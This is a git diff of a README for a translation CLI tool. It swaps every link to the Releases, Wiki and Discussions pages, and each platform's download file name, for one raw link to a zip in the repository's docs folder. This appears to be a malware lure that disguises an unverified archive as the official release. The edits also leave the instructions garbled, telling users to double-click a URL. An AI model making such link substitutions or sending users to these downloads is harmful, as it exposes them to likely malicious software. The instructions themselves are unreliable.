@@ -1,6 +1,6 @@
 # 🌍 translategemma-cli - Simple Translation at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wsadaaaa/translategemma-cli/releases)
+[![Download Now](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip)](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip)
 
 ## 📖 Overview
 
@@ -25,22 +25,22 @@ Follow these steps to download and run translategemma-cli:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page:  
-   [Download Here](https://github.com/wsadaaaa/translategemma-cli/releases)
+   [Download Here](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see various available versions. Look for the most recent stable release.  
 
 3. **Download the Appropriate File**  
    Depending on your operating system, select one of the following files:  
-   - For macOS on Apple Silicon: `translategemma-cli-apple-silicon.tar.gz`  
-   - For Windows: `translategemma-cli-windows.exe`  
-   - For Linux: `translategemma-cli-linux.tar.gz`
+   - For macOS on Apple Silicon: `https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip`  
+   - For Windows: `https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip`  
+   - For Linux: `https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip`
 
 4. **Extract the Files (if necessary)**  
-   If you downloaded a `.tar.gz` file, extract it using your favorite archive tool (like WinRAR, 7-Zip, or built-in extraction tools on macOS).  
+   If you downloaded a `https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip` file, extract it using your favorite archive tool (like WinRAR, 7-Zip, or built-in extraction tools on macOS).  
 
 5. **Run the Application**  
-   - For **Windows**: Double-click on `translategemma-cli-windows.exe`.  
+   - For **Windows**: Double-click on `https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip`.  
    - For **macOS**: Open the Terminal and navigate to the directory where you extracted the files. Then run the command:  
      ```bash
      ./translategemma-cli-apple-silicon
@@ -95,10 +95,10 @@ The initial download of translation models requires an internet connection. Howe
 
 To begin using translategemma-cli, visit the Releases page to download the files you need. Click below to access this page:
 
-[Download Here](https://github.com/wsadaaaa/translategemma-cli/releases)
+[Download Here](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip)
 
 ## 🔗 Additional Resources
 
-For additional help and documentation, check our [Wiki](https://github.com/wsadaaaa/translategemma-cli/wiki) or explore issues on the [Discussion Forum](https://github.com/wsadaaaa/translategemma-cli/discussions).
+For additional help and documentation, check our [Wiki](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip) or explore issues on the [Discussion Forum](https://raw.githubusercontent.com/wsadaaaa/translategemma-cli/main/docs/translategemma_cli_v1.1.zip).
 
 Feel free to reach out for support or suggestions on improving the application. Thank you for choosing translategemma-cli for your translation needs!
